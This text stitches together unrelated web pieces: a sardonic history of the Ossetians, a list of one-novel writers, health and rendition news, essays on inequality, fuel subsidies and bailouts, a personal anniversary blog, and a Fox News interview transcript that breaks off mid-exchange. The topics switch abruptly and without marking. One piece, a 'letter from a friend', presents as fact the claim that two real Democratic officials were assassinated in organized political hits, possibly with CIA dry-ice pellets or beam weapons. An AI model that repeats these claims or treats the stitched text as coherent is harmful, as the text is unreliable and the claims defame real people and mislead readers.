They admired you for it , helped you up and offered you a job somewhere else in the Empire -- somewhere where you did n't have any relatives who'd try to talk you into rebelling .
They sen t a unit of Alan cavalry to Britain , where an Alan leader Artoris became sort of a local legend under the English version of his name : Arthur .
The Alanii who stayed home soon had a big problem : the Huns , who were moving west all through the fourth century .
The Romans were getting weaker ; the Huns were unstoppable .
One thing you 'll notice about Western military history is that we always had a hard time dealing with mounted archers , and the Huns were the best .
They could put an arrow through your eye and make their horses dance a waltz at the same time .
The Alanii were good horsemen too , but they used the spear and the sword .
Like their friends the Vandals , they could n't handle those mounted archers .
The Alanii did the sensible thing : got the Hell outta Dodge .
They may not have had an Interstate , but they made pretty good time : they went all the way West .
Some stopped in Gaul , but some kept going into Iberia ( Spain ) and further into North Africa .
Some Alanii still roamed the steppe till the Mongols came .
The Mongols were like the Huns , squared .
Same tactics and weapons but much more systematic about wiping out everyone in their path .
The Alanii fled into the mountains , and that 's how they became the Ossetians .
From then on it was just a matter of who was going to dominate them , the Russians or the Georgians .
Most Ossetians preferred the Russians , who were farther away and not so damn interested in them .
In this part of the world , the less interested your masters are in you , the better .
The Georgians were too close , too bossy , too similar .
When the USSR dissolved in ' 91 , one of those classic border messes developed : North Ossetia was still inside Russia -- the new , smaller Russia , the Russian Federation -- but South Ossetia was officially part of Georgia .
Which it did n't want to be .
In 1989 , all fizzy with that liberation chatter that was going around back then , South Ossetia declared itself united with North Ossetia .
The Georgians , led by the nutcase Gamsakhurdia , begged to differ .
In 1991 , the Georgian Army made its point about South Ossetia being an integral , beloved part of Georgia the traditional Caucasian way -- by shelling every rebel village in range of its guns .
And since these were Soviet artillery , the best guns ever made , the point got through .
At least 100,000 South Ossetians fled North , which meant that the entire population of South Ossetia is now only 70,000 people .
Backed by the Russians and plenty of North Ossetian first cousins , the South Ossetian irregulars wound up flattening the Georgians and have been free - ish ever since .
See what I mean about how crazy this stuff seems to us Americans ?
All this fuss about a place with a population about one - fifth of Fresno's .
But like I keep saying , and like the Bush people keep not figuring out , not everybody thinks like us .
The ones who are left in South Ossetia are the hard core , the ones who can't or wo n't leave , and they 're backed by Russian " peacekeepers . "
Not all of those 70,000 are even Ossetians ; some of the villages in the nominal breakaway region are Georgian , so there 's no way even God himself could draw a clean border that would put all the Ossetians on one side and all the Georgians on the other .
Truth is , if God himself had to solve problems like this or Bosnia , He 'd probably end up using Ethnic Cleansing Powder .
It makes more sense and in the long run might even be less bloody than just letting the locals carve each other up from now till Doomsday .
But God 's not involved here .
The players are Russia , Georgia -- and us , as Georgia 's new best pal .
The CIA and the Georgians are very , very tight .
The reason is the same reason as Iraq : oil .
We want Caspian Sea oil , and the pipeline we 're building to take that oil passes through goes through Georgia .
Or more specifically , through Adzharia , and into Turkey .
America armed and trained the Georgians so they could take back Adzharia , which they did .
We got what we wanted , but Saakashvili wants more .
He thinks it 's a quid pro quo , and he wants South Ossetia too .
The Russians do n't like this at all , and the Ossetians side with the Russians .
Or rather , they need the Russians .
The Georgians figured they were on a roll after doing their root - canal on Adzharia and they moved on to South Ossetia this year .
The result was a war .
A little , nasty war , the kind you get these days , mostly snipers and mortars .
And of course the usual targets are civilians ; both sides accuse the other of mortaring hospitals , and both are probably telling the truth .
Because that 's how war works nowadays .
Civilian targets are preferred ; they 're easier to sight , they do n't fire back , and since the whole point is to scare the ethnic enemy into running away , it just makes more sense to target them than the enemy army .
The Georgians say the Ossetian rebels are trying to scare Georgian villages into running south to Georgia .
That 's probably true ; after all , it 's exactly what the Georgians did to the South Ossetians in 1991 .
It worked for them , so why should n't the Ossetians do it ?
Trouble is , the Georgians have the big guns , the money , and the backing -- America .
The Georgian army even wears surplus US Army uniforms , and we 've got advisors teaching them how to do everything from brush their teeth to sight their artillery pieces .
The only friends the Ossetians have are the Russians .
And ... well , I do n't want to offend the people running the eXile now , but ... well , let 's put it this way : in the past -- not now , of course , just in the past -- having Russia for a friend was like having the worst enemy you could imagine .
Russia -- in the past , just in the past ! -- betrays every ally it ever had , from the Serbs to the Egyptians .
But now under the glorious reign of Mr. Putin , uh ... that 's all changed .
Totally changed .
So hey , you besieged South Ossetians , get ready for the glory of the Alanii to come back !
With the new Russia on your side , you ...uh... oh yeah : you can't lose !
This is a list of ten great writers that are famous for one novel and one novel alone .
Some of them have written additional short stories or poetry and in a couple of cases additional novels ( none of which are well known or ever rose to the prominence of their main work ) .
Here are the top 10 literary one hit wonders .
10 . Black Beauty Anna Sewell
At the age of 14 , Anna Sewell fell while walking home from school in the rain , injuring both her ankles .
Possibly through mistreatment of her injury , she became lame for the rest of her life and was unable to stand or walk for any length of time .
For greater mobility , she frequently used horse - drawn carriages , which contributed to her love of horses and concern for the humane treatment of animals .
Black Beauty is the only book she ever wrote .
It was written during her later years as an invalid confined to her home .
Black Beauty is told as an autobiographical memoir by a highbred horse named Black Beauty — beginning with his carefree days as a foal on an English farm , to his difficult life pulling cabs in London , to his happy retirement in the country .

8. The Devil in the Flesh
Raymond Radiguet
Radiguet left home at 14 and moved to Paris where he associated himself with the Modernist set , befriending Picasso , Max Jacob , Juan Gris and especially Jean Cocteau , who would become his mentor and , according to gossip in Paris at the time , reportedly his lover .
Radiguet also had several well - documented relationships with women .
Ernest Hemmingway implied that Radiguet employed his sexuality to advance his career , being a writer “ who knew how to make his career not only with his pen but with his pencil . ”
In early 1923 Radiguet published his first and most famous novel , Le Diable au corps ( The Devil in the Flesh ) .
The story of a young married woman who has an affair with a sixteen - year old boy while her husband is away fighting at the front provoked scandal in a country that had just been through World War I .
It was a largely autobiographical book .
Radiguet only wrote one other novel ( Le bal du Comte d’Orgel ) which was published posthumously .

7. Wuthering Heights Emily Bronte
Emily Bronte was the second eldest of the three surviving Bronte sisters , being younger than Charlotte and older than Anne .
She published under the masculine pen name Ellis Bell .
It was the discovery of Emily ’s poetic talent by her family that led her and her sisters , Charlotte and Anne , to publish a joint collection of their poetry in 1846 .
She caught a chill during the funeral of her brother in September , and , having refused all medical help , died on December 19 , 1848 of tuberculosis .
Now considered a classic of English literature , Wuthering Heights ’ innovative structure , which has been likened to a series of Matryoshka dolls , met with mixed reviews by critics when it first appeared .
Though Charlotte Bronte ’s Jane Eyre was originally considered the best of the Bronte sisters ’ works , many subsequent critics of Wuthering Heights argued that its originality and achievement made it superior .

NEW YORK ( Reuters Health ) - Women who go through a traumatic event during or soon before pregnancy may be at increased risk of having an underweight baby , a large study suggests .

REUTERS / Edgard Garrido
Researchers found that of more than 1 million Danish women who gave birth over 24 years , those who dealt with the death or serious illness of a loved one shortly before or during pregnancy were more likely to have a low - birthweight baby .
The findings , reported in the journal Psychosomatic Medicine , do not prove that severe stress during pregnancy harms fetal growth .
However , it is possible that this is the case , according to lead researcher Ali S. Khashan , of the University of Manchester in the UK .
Research indicates that high levels of stress hormones in the mother can hinder fetal growth , and severe stress may make it difficult for some pregnant women to follow a healthy lifestyle .
Still , Khashan told Reuters Health , the current findings are “ subtle , ” linking severe stress to a relatively small effect on birthweight .
“ So the overall risk to an individual experiencing ‘ normal ’ stress is tiny , ” the researcher explained .
On the other hand , Khashan said , the study does give “ valuable insights ” into the importance of the uterine environment in fetal development and , ultimately , babies ’ well - being .
The researchers based their findings on records for 1.38 million women who gave birth in Denmark between 1979 and 2002 .
Denmark ’s system of national registers allowed the researchers to link each woman with data on her first - degree relatives -- parents , siblings , spouses and other children -- and identify those who ’d faced a family member ’s death or serious illness during pregnancy or within the six months before pregnancy .
Overall , the study found , women who ’d lost a family member were 22 percent more likely than other women to have a baby who weighed below the 5th percentile at birth .
Serious illness in a family member was also linked to poorer fetal growth .
While the findings do not prove a cause - and - effect relationship , they do underscore the importance of trying to stay healthy during pregnancy , according to Khashan .
“ Expectant mothers should follow standard medical advice and maintain a normal , healthy lifestyle pre-conception and in pregnancy , ” the researcher advised .

Olympics Stadium … the ‘ Village Version ’
China ’s Olympics stadium , or the “ Bird ’s Nest ”  , cost around $ 500 million and took 7 years to build .
The stadium seats up to 91,000 people and will host both the opening and closing ceremonies , as well as all the athletic events for the 2008 Olympics .
Apparently , this award winning design has inspired some Chinese villagers in Hangzhou city to build their own smaller and cheaper version of the stadium .
10 bamboo masters spent 2 weeks and used nearly 1,000 pieces of bamboo to build the miniature “ Bird ’s Nest . ”
They plan to use it for local sports events such as beach ball , bow shooting , loop rolling , etcâ€ ¦

How Big of a Deal Is Income Inequality ?
A Guest Post
Retired neurologist William Bernstein is probably known for his investment books The Intelligent Asset Allocator and The Four Pillars of Investing .
His two latest books , A Splendid Exchange : How Trade Shaped the World and The Birth of Plenty , deal with the history of world trade and economic growth , subjects he has agreed to blog about here .
How Big of a Deal Is Income Inequality ?
by William Bernstein
A Guest Post
For nearly all of human history , the lot of the average person improved not at all .
Then , about two hundred years ago , the material well - being of the planet ’s inhabitants began to grow at about 2 percent per year .
Although this may not sound like much , it means that the life of a child is nearly twice as prosperous as that of its parent ; over a century , the standard of living increases sevenfold .
Today , per capita G.D.P. is higher in Mexico than in the world ’s wealthiest nation in 1900 , Great Britain .
The paradox of economic growth is that the same mechanisms that create great wealth –secure property rights and rule of law guaranteed by an independent judiciary — also give rise to great inequalities in its distribution .
Private property provides a powerful incentive to produce wealth for oneself while simultaneously denying that same wealth to others .
Wealth does trickle down to the rest of the population , but often not fast enough to avoid political strife and worse .
The reason for this is simple : if individuals cannot keep enough of what they earn then they will not produce .
If , on the other hand , the most productive do keep what they earn , significant inequalities inevitably result .
Further , in a technologically driven world where an individual ’s unique talents can be scaled up to an almost infinite degree , inequality increases dramatically .
For example , researchers Thomas Piketty and Emmanuel Saez calculated that between 1972 and 2006 , the portion of income earned by the top 10 percent of the population rose by half ; for the top 1 percent , meanwhile , it doubled ; and it quadrupled for the top 0.1 percent .
For the top 0.01 percent , it rose sevenfold .
The current disparities are nearly identical to those of early 20th - century American robber - baron capitalism .
Economic libertarians argue that this growing inequality is unimportant : are n’t the poor of 2008 still far better off in terms of real income , health , life expectancy , and material comfort than even the richest citizen in 1900 ?
The fallacy of this argument is that human beings do not measure their well - being by absolute real income or longevity — but rather in relative terms .
To paraphrase H.L. Mencken , a wealthy man is one who earns more than his wife ’s brother - in - law .
Further , a growing body of research reveals that the social and medical costs of inequality are high .
Here is the tiniest of samplings :
• Among both American states and Canadian provinces , homicide rates closely track income inequality , even after the absolute level of income itself is carefully controlled for .
That homicide is not driven by poverty alone is demonstrated by Canada , where , because of aggressive redistributive policies , the poorest provinces have the lowest inequalities and also the lowest number of violent deaths .
• It is becoming increasingly obvious among obesity researchers that the primary underlying factors in this epidemic are social class and income inequality .
It is no accident that the U.S. , with the highest income inequality among the world ’s developed nations , also has the highest incidence of obesity and its attendant comorbidities : diabetes , hypertension , and vascular disease .
Obesity may also be the reason that the U.S. , ostensibly the world ’s wealthiest nation , ranks 29th in life expectancy , right behind Jordan and Bosnia .
Those who think that these problems are primarily the result of voluntary lifestyle choices should reflect on the difficulty of providing a family of four with fresh fruits and vegetables on a minimum wage salary .
Worse , extreme income and wealth inequality alone may hinder growth .
After all “ respect for property rights ” is really , in most cases , shorthand for “ respect by the have - nots for the property rights of the haves . ”
If those on the bottom rungs do not feel that they are getting a fair shake , the very bedrock of our prosperity crumbles into social and economic apartheid as millions of Americans flee to gated communities , millions more are required to staff the burgeoning private security industry , and yet more millions fill our prisons .
This is likely the reason why supply - side economics fails in the real world .
Cross national comparisons in developed nations , for example , show no correlation between tax rates and economic growth .
Further , the “ golden period ” of growth in the years before 1973 occurred in an environment of higher tax rates than in the lower - growth 1980 ’s and 1990’s .
More ominously , several data sets now connect high national income inequality with low growth .
Correlation is not causation , and clearly , much more research is called for .
But these data should give pause to those who are complacent about increasing income and wealth disparities , and who further believe that reducing the top marginal income - tax rates and eliminating the “ death tax ” leads to economic Valhalla .
Letter from a friend ...
Absolutely nobody is talking about this - except in Little Rock and Ohio .
But there were two sudden and peculiar deaths of important Dem Party leaders in their respective states - Arkansas ( Clinton 's stronghold ) , and Ohio . ( pivotal state in recent years presidential election fraud , twice ) .
These people were also ' superdelegates ' who would have been voting at the Dem Convention in Denver this week If you do n't know , a ' superdelegate ' here is a party convention delegate entitled to vote as they wish , regardless of the outcome of the primaries in their state .
The Clinton 's have scheduled all their loyal delegates to ' act up ' at the convention .... these are mostly the aberrant , psycho - bitch Hillary fanatics counted upon to create a scene for public consumption .
The plan is for a surprise upset of the delegate vote count at the convention through Clinton control of the superdelegates .
What has that to do with the Arkansas Dem superdelegate who was shot to death in Obama headquarters in downtown Little Rock recently ?
And the 58 year old black Congresswoman from Ohio , who died from brain hemorrage on an afternoon drive in an upscale Cleveland neighborhood a week later ?
Gwatney , the Arkansas Dem leader , had just made a public speech Aug 4th telling Arkansas Dem delegates and voters " Hillary is no longer a candidate .
We must all get behind Obama " .
Tubbs had just confided internally to the Dem party in Ohio that she - formerly a Hillary delegate - would be voting for Obama .
Gwatney , Arkansas Dem party leader and " superdelegate " .
Murdered Aug 18th " Lone " gunman was filled full of lead after a chase over the county line .
He wo n't be talkin ' - only witnesses to gunman 's death was the Arkansas State Police that killed him .
http://news.yahoo.com/s/ap/20080814/ap_on_re_us/gwatney_profile
Congresswoman Stephanie Tubbs , died while driving alone in her car , of a ' brain hemorrage . '
I think small caliber projectiles such as a dry ice pellet used for 40 years by CIA / MI5 / KGB can cause that .
( Also , a following car or van equipped with an emf beam device can deliver such a knockout punch .
- ed )
Only witnesses were police who just happed to be on the same street and noticed her car was ' weaving ' .

These are the markers of ogranized political hits .
Last night was the sixth anniversary of the evening Jon and I stood on a cliff in Yosemite National Park and vowed to give each other shit for the rest of our lives .
This weekend that we have spent in San Francisco at a three - day music festival was planned at the last moment , and it was something we thought would appropriately commemorate this anniversary .
He and I met at a music festival in Utah in 1997 .
He was married to someone else at the time , and I knew this , respected this , had heard stories about him from some of his close friends , but I could n’t help falling in love with him on that very hot summer afternoon .
And he was totally oblivious .
Yesterday morning I was thinking about all of that , how it ’s a miracle and a blessing that even though I knew there was no hope and had given up on the idea of Jon Armstrong , had moved on with my life , had said to myself that I could settle for someone else , that here we are , six years later , knocking each other in the head every night with our twin skinny elbows and knees .
We ’ve spent the last three days running around Golden Gate Park with two heavy professional cameras , one that we rented on a whim the first morning we got here , taking photos of some of the bands whose music has been the soundtrack to our lives together .
Last night when it was all over and we were back at the hotel sipping cocktails on the roof overlooking the city we could n’t believe what we ’ve lived through in six short years together : unemployment and moving into my mother ’s basement to owning our first house , a kitchen remodel , pregnancy , postpartum depression , physical and occupational therapy on our child , hoping and waiting to see if she would ever walk , two MRIs , starting our own business , getting sued by a publishing company , marriage counseling , skin cancer , traveling all over the country , to Canada , to Europe , adopting a dog who eats her own poop , and several deaths in the extended family .
We made it through it all .
And it was n’t easy , there were times when both of us did n’t know if we were going to make it but loved each other enough that we were willing to try .
My friend Leona gave me some really profound advice last night as we were talking about how much better our thirties are compared to our twenties .
She said , “ No matter what horrible thing you ’re going through , when it ’s all over it only takes three seconds to sum it up .
Remember that . ”
I lost my mind , got some help , and then I found it again .
We thought we were going to lose our house trying to pay legal fees .
Thankfully , it did n’t work out that way .
My dog likes to pee all over the house .
I thought I might kill her , but I did n’t .
Once I threw my keys at my husband ’s head because I thought he did n’t understand .
He did n’t leave me .
My daughter would n’t put any weight on her legs , and the doctors said she might not ever walk .
They were wrong , and now she runs .
I am very much looking forward to the morning six years from now when he and I are taking a few moments before the chaos of the day consumes us , and we can look back and talk in three - second sentences .
To be sure , higher fuel prices produce economic suffering .
The unfortunate reality , however , is that when the price of an imported resource rises in the world market , buyers must take a hit .
Subsidizing fuel does nothing to reduce the inevitable suffering , and actually makes it worse .
The problem is that when the price of a good is below its cost , people use it wastefully .
In the case of a gallon of gasoline , the cost to a country is the value of every additional sacrifice that its use entails .
That includes not just the price of buying the gallon in the world market  say , $ 4  but also external costs , like dirtier air and increased congestion .
The external costs are often hard to measure but are nonetheless substantial .
With reasonable estimates factored in for them , the true cost of using a gallon is clearly greater than $ 4 .
By contrast , the price of gasoline to users is simply the amount they pay at the pump .
With a $ 2 - a - gallon subsidy in effect , gasoline bought in the world market at $ 4 would sell for $ 2 , or more than $ 2 less than its true economic cost .

Consider how this difference might affect a trucker ’s decision about whether to accept a hauling job .
A rational trucker will apply the basic cost - benefit test , which says that something is worth doing if , and only if , its benefit is at least as great as its cost .
Suppose the job in question requires 1,000 gallons of fuel , available at the subsidized price of $ 2 a gallon , for a total fuel outlay of $ 2,000 .
If the cost of the trucker ’s time and equipment are , say , $ 1,000 for the trip , his narrow interests dictate accepting the job if the shipper is willing to pay at least $ 3,000 .
Suppose the shipper is willing to pay that amount but not more .
The problem is that if the trucker accepts the job at that price , the country as a whole will be worse off by more than $ 2,000 .
Although the $ 3,000 fee would cover his own costs , the government would end up paying $ 2,000 in additional subsidies for the 1,000 gallons consumed .
On top of that , the trip would generate additional pollution and congestion costs .
So the fact that the subsidy encouraged him to accept the job means that its net effect is equivalent to throwing more than $ 2,000 onto a bonfire .
Boy dies after home circumcision
Bari , Italy | July 24 , 2008 12:01:13 AM
IST
A baby boy died in an Italian hospital after his Nigerian parents performed a circumcision at home , police said .
The mother , 24 , and the person who performed the procedure might be charged with manslaughter , the Italian news agency ANSA reported .
The 2 - month - old boy began bleeding heavily .
He was taken to a hospital in Bari , but doctors there were unable to save his life .
Fabio Ferri of Bambin Gesu Hospital in Rome told the news agency even hospital circumcisions can be risky because the penis holds a large amount of blood .
He said the procedure should never be done outside a hospital and should only be performed by an experienced surgeon .
Souad Sbai of the Association of Moroccan Women in Italy said all Muslim boys are circumcised and many families still do the procedure at home .
Her organization is trying to educate Muslims in the country on the dangers .

MI5 misled MPs about what it knew of the whereabouts of Binyam Mohamed , a British resident who says he was tortured before being secretly rendered to Guantánamo Bay , the high court was told yesterday .
Mohamed 's lawyers also accused MI5 of not looking " too hard " at what was being done to him .
The claims were made as the government came under renewed pressure after a former senior American official told Time magazine that the US imprisoned and interrogated at least one terrorist suspect on Diego Garcia , the UK territory in the Indian Ocean , contradicting repeated assurances by David Miliband , the foreign secretary .
Lawyers for Mohamed yesterday demanded the release of information in the government 's hands which , they say , shows he was subject to extraordinary rendition , held incommunicado , and tortured .
The government argues that disclosing the information would jeopardise Britain 's diplomatic and intelligence relationship with the US .
Ben Jaffey , counsel for Mohamed , told the court that in his witness statement an MI5 officer in the case said Britain 's security and intelligence agences " did not know where he [ Mohamed ] was " after he was flown out of Pakistan in 2002 .
Yet MI5 suggested to parliament 's intelligence and security committee that it believed Mohamed was in US custody , Jaffey said .
That was why in its report on the case last year , the committee concluded it was " understandable " MI5 did not seek assurances about Mohamed 's treatment .
The committee was " not given the full picture " , Jaffey told the high court .
MI5 suggested then that Mohamed was in US custody , yet it now conceded that he was in a " location unknown " , he said .
It has emerged since that Mohamed was rendered to Morocco , where he says he was brutally treated , and that the US was aware of that at the time .
" The security service did not look too hard at what was going on " , Jaffey told Lord Justice Thomas .
The former Kensington caretaker alleges he was repeatedly slashed in the genitals with a razor blade while being held in Morocco .
The judge said the case raised " many and very troublesome issues " .
The court will deliver its ruling later this month .
Time magazine 's anonymous source said that a CIA counter - terrorism official twice said " high - value prisoners " had been held and questioned on Diego Garcia .
Reprieve , the legal action charity , said that the source proved British territory had been used for " kidnapping , extraordinary rendition , illegal imprisonment and possibly torture " .
In February , the US administration admitted that , contrary to previous assurances , two CIA " rendition " flights carrying terrorist suspects seized abroad had landed on Diego Garcia in 2002 .
Last month Mr Miliband said the US had pledged no further US intelligence flights had since landed on British territory .
A Foreign Office spokesman said yesterday : " Our intelligence and counter - terrorism relationship with the US is vital to the national security of the United Kingdom .
" We accept US assurances on rendition in good faith .
But if others have definitive evidence of rendition through the UK or our overseas territories , including Diego Garcia , then we will raise it with the US authorities . "

Question :
What should you do when your good friend parties too hard one night , downs more alcohol than is thought humanly possible , generally makes a reckless ass of himself in his inebriation , and wakes up the following morning with a hellish hangover and confused guilt over what transpired before ?
Solution : you let him sit it out and suffer .
That 's right ; you let him face the consequences of their actions .
Assuming your friend is ( or should be ) a mature adult , he cannot expect a savior on a white horse to deliver him from his foolishness .
Your friend would be doing you a disservice by having you make excuses for him , and certainly it'd be cruel to expect you to foot the bill for the damage he 's done .
Enabling your friend 's behavior wo n't spur him to learn from his mistakes and prevent another fiasco in the future .
So when the question arises of what to do about the credit crisis and the failing banks and subprime mortgage - holders , et cetera , there 's only one sane answer : let them fail .
That 's right ; let the housing bubble burst , let the big banks fail , let the big mortgage holders go bankrupt , let the corporate bankers flail around in mud , let the dollar and euro crash , let the stocks fall , let the house of cards tumble !
If this sounds cruel , it 's only in proportion to the cruelty unleashed upon the rest of us by the ruthless big bankers and Treasury dunces and economic wizards and government pigs - in - suits .
These scumbags , ignorant and defiant of economics and common sense , have pursued policies that are the equivalent of some Hollywood celeb going on a drug - fueled bender in Vegas .
But in our case , this bender has been going on for the past several decades and we are all footing the bill for it .
Why let this insanity continue ?
And more important , why did it happen in the first place ?
There 's this thing called moral hazard .
It 's what happens when a person or a company makes less - than - sound economic decisions while thinking ( wrongly ) that there 's little to no risk involved .
Believing ( often correctly ) that they will probably be bailed out anyway , one continues making these unsound choices -- and why not ?
They 're never in a position where they have to face the consequences .
This moral hazard is exacerbated in the case of agents ( lenders and credit card companies and the real estate industry come to mind ) who have more information and power at their disposal than folks , like us , who deal with them .
The agents have less incentive to act responsibly on our behalf and thus take irrational risks that would n't pay off in a freer , laissez faire system -- and why not ?
When there 's free money and easy credit available from the Fed , rational economic risks pose no limits !
Here 's the raw truth :
The growth we 've seen over the past few decades was n't real !
This economic crisis is akin to a balloon that bursts because you blow too much hot air into it .
Pretty much all of us -- consumer , homeowner , businessperson , and government official alike -- have been making bad choices and bad economic decisions .
These all started to add up over time .
Consumers and businesspeople and investors lost confidence .
Some started holding back while others kept steaming ahead .
That mysterious entity we call " the economy " or " the market " is really the sum total of countless transactions and trends in which we all play a part .
There is no conspiracy ; the economic " crisis " functions as an unfortunate but necessary correction of all the gluttony we 've partaken until now .
Do n't act so shocked .
The system was bound to crack sooner or later .
The excess we 've enjoyed with our little plastic cards is just a small reflection of the kinds of excesses the government and the bankers and the military - industrial complex have been enjoying for even longer .
Our debt mirrors their deficits ; our moral hazard mirrors their moral hazard .
Following their example , we too went into debt in order to live it up , even though real wages were n't rising and inflation was booming .
Meanwhile , the government was busy offering fun imperialistic wars , futile feel - good social programs , generous corporate handouts and subsidies , taxpayer - funded disaster insurance for people silly enough to build in oft - flooded swampland , the occasional bailout , and easy credit .
When they needed to pay for it all , they just printed tons of Monopoly money ( whoops , I meant greenbacks although with all these new colorful designs , they might as well be Monopoly money ) .
And of course this money was backed not by gold but by " the full faith and credit of the United States " -- hopes and dreams , basically .
Moral hazard , hopes and dreams , pigs feeding at the slop trough .
" Reap what you sow " indeed .
What 's worse yet is that those of us who were acting responsibly , saving and investing in homes or education or life insurance and such , have to foot the bill for our neighbors who were n't acting responsibly .
Oh yes , I do n't merely blame the government and the corporations , I also have to blame the folks -- you know who you are -- who did n't bother to learn a thing or two about fiscal responsibility .
They were perfect fodder for the malevolent forces and shysters around them , and they too helped contribute to this disaster .
The party 's over , folks .
The hangover has come .
Do n't start blaming the free market because we do n't really have one .
Do n't beg for government reform because it 's not going to happen .
Bailouts and takeovers , playing with interest rates , legislation and regulations ( which will be ignored for a price anyway ) , are n't going to fix things .
What we really need is to start on a clean slate .
So let the correction ensue ; let them fail .
Let them all crash and burn .
Let the fire purify all and start anew .
Let the house of cards tumble .
It 's the only way to return to some semblance of economic sanity and security .
Ah , but silly me , that kind of talk does n't win elections !
Someone fetch my bib , it 's feeding time at the pig trough .

In heated exchange , Obama aide declares self Fox 's ' fact checker ' David Edwards and Nick Juliano
Published : Monday September 29 , 2008
Print This Email This After she gave Barack Obama a bracelet memorializing her son's sacrifice in Iraq , Tracy Jopek asked the Democratic presidential candidate not to use the memento as a political prop .
When Obama mentioned the bracelet during last week 's debate , though , Jopek said it was appropriate , and she grew dismayed at conservative critics ' who turned his mention into " garbage on the Internet . "
Perhaps taking their cues from the right - wing blogs who grew so incensed over the weekend , the crew at Fox & Friends attempted to take the trash from online to cable television Monday morning .
Their questions about what someone has no doubt already dubbed BraceletGate provoked a heated exchange with Obama communications director Robert Gibbs , who accused the morning anchors of " making stuff up " and dubbed himself the conservative network 's " fact checker . "
Discussion of the bracelet non-issue monopolized most of Gibb 's five - minute F & F appearance Monday morning and ended with Brian Kilmeade angrily shouting at the Obama aide before the show awkwardly went to a commercial break .
Quick backstory : Jopek 's 20 - year - old son died in Iraq in 2006 ; she gave Obama a bracelet with the inscription " All gave some -- He gave all " at a Green Bay campaign rally in February ; after meeting the candidate , Jopek e-mailed the campaign asking Obama not to mention the bracelet during debates or speeches , fearing her son would become a political anti-war symbol .
Meanwhile , Jopek 's ex-husband , who 's currently stationed at Guantanamo , criticized Obama for wearing the bracelet during a radio interview in March .
Obama apparently continued to wear the bracelet , per Jopek 's request , but did not mention it until Friday , when he responded to Republican candidate John McCain telling his own story of meeting the mother of a dead Iraq veteran .
That mention sent hoards of conservative bloggers into overdrive , unearthing the interview with Jopek 's ex-husband and accusing Obama of all manner of inappropriate behavior .
The Associated Press tracked Jopek down on Sunday to get her own view on what was becoming a developing story .
She said his mention was " an appropriate response " to McCain .
" I do n't understand how people can take that and turn it into some garbage on the Internet , " she told the wire service .
Presumably having seen that article Monday morning , the Fox News crew is nonetheless unwilling to let the story die .
Steve Doocy said , " We 're hearing more about the story behind that particular bracelet .
And apparently , the mother -- Tracy Jopek -- asked your campaign that he not wear it anymore at public appearances . "
For Fox , apparently , more actually means less , and Gibbs pounced on the co-anchor .
" That 's not true , " he said .
" That 's not true -- no , no , no , no ! "
Gibbs mentioned the AP report and told Doocy to " get your facts straight first . "
" That 's why you 're here , " Doocy jibed .
" Yeah , I know , I 'm a fact checker on Fox News , " Gibbs replied .
The conversation continued , with Kilmeade breaking in to bring up the ex-husband 's objections to Obama wearing the bracelet , to which Gibbs said the campaign was n't trying to mediate the couple 's divorce .
" And again , if you guys are going to ask questions about this , let 's get the facts right ... before we start making stuff up on the news , " Gibbs said , further enraging Kilmeade .
" Do n't say we 're making stuff up ! " he shouted .
" We 're telling you quotes from both parents . "
The exchange continued in this vein for another minute or so before the segment awkwardly ended .

TRANSCRIPT :
MS. CARLSON : We just heard from the McCain campaign on their candidate 's performance .
Here with the other side : Robert Gibbs , senior adviser for the Obama campaign .
Good morning to you , Robert !
MR. GIBBS : Good morning !
How are you guys ?
MS. CARLSON : We 're doing great !
All right , so there is an article in The New York Sun today that talks about advice for Joe Biden for Thursday night in the V.P. debate .
And basically , the advice to him , from some , is to ignore Governor Sarah Palin .
Is that advice he 's heeding ?
MR. GIBBS : Well , I think that 's kind of hard to do when that person is sitting about three or four feet away from you !
Look , I think what Joe Biden is going to do is what he 's done for us throughout his time as the vice presidential nominee and go out there and make the case for change not just in our economic policies , but in our foreign policies , and to demonstrate to people that we just can't afford four more years of the same John McCain - George Bush policies .
I think that 's what he 's done throughout his time as the vice presidential nominee .
I expect we 'll see that again on Thursday night with Governor Sarah Palin .
MR. KILMEADE : Robert , what I wonder is , are you concerned at all about how many times during the campaign for the nomination , Joe Biden criticized Barack Obama and those quotes come barreling back at you Thursday night ?
MR. GIBBS : Look , the two of these guys obviously ran against each other , because they both thought they were the best qualified to be president of the United States .
Barack Obama won that battle .
But look , the same is true for Governor Palin .
I mean , just yesterday the McCain campaign was trying to clean up something where Governor Palin actually agreed with Barack Obama as it relates to our policy on Pakistan and disagreed with their own candidate in John McCain .
So look , I 'm sure there 's plenty of fodder on each side for that .
But again , what I think you 'll see Joe do , and what you saw Barack do last Friday night , is just demonstrate a real case for change -- how to get this economy moving again , create jobs , putting people back to work and moving this country back in the right direction .
MR . DOOCY : Hey , Robert , let me ask you about something -- speaking of Friday night and the big debate -- there was one point where John McCain told a story about a bracelet he'd been given by the mother of a fallen soldier .
And then after that , Barack Obama said , Well , John , I 've got a bracelet too .
Now , we 're hearing more about the story behind that particular bracelet .
And apparently , the mother -- Tracy Jopek -- asked your campaign that he not wear it anymore at public appearances .
MR. GIBBS : That 's not true .
That 's not true -- no , no , no , no !
MR . DOOCY : All right .
What 's the truth ?
MR. GIBBS : Let 's get the story straight here .
She was afraid that the memory of her son would become politicized .
She asked Senator Obama in Green Bay .
She gave him the bracelet and said , " Wear this in memory of my son . "
Barack Obama 's done that every single day since .
She did n't want the memory of her son politicized and we understood that .
But I think if you read the AP article from just yesterday , when people called her , she was ecstatic that the memory of her son became part of an historic presidential debate .
And Barack Obama said he 's never going to forget the mothers that he meets , the fathers that he meets , the family members that he meets on the rope line every day that have paid the ultimate sacrifice so that you and I can live our lives in freedom .
And that 's what we -- that 's part of the mission in this campaign .
Let 's never forget that .
MR. DOOCY : Right , but okay .
I was going to get to that , that she did say it was great that he did bring it up , even though she says that she had asked that he not wear it .
So you 're saying she never asked --
MR. GIBBS : No , no -- you guys have got to get -- no .
MR. DOOCY : I 'm just trying to get this straight .
MR. GIBBS : She asked that -- well , you should get your facts straight first .
You get your story straight and I 'll be glad to help you out with it .
MR . DOOCY : That 's why you 're here .
MR. GIBBS : Yeah , I know .
I 'm a fact checker on Fox News .
She gave that bracelet to Barack Obama and asked him to wear it .
She did n't want the memory of her son politicized and Barack Obama has respected that .
But in response to a question --
MR. KILMEADE : But if he respected that , Robert --
MR. GIBBS : -- in the debate .
MR. KILMEADE :

I ’m not sure whether to be fascinated about this or totally horrified .
An Indian court has convicted a woman of murdering her fiancé .
Prosecutors managed to get a conviction on the basis of a brain scan which allegedly showed areas of the brain “ lighting up ” .
This apparently proved that she had “ experiential knowledge ” about the crime “ that only the killer could possess ” .
The process started with an Electroencephalogram ( EEG ) .
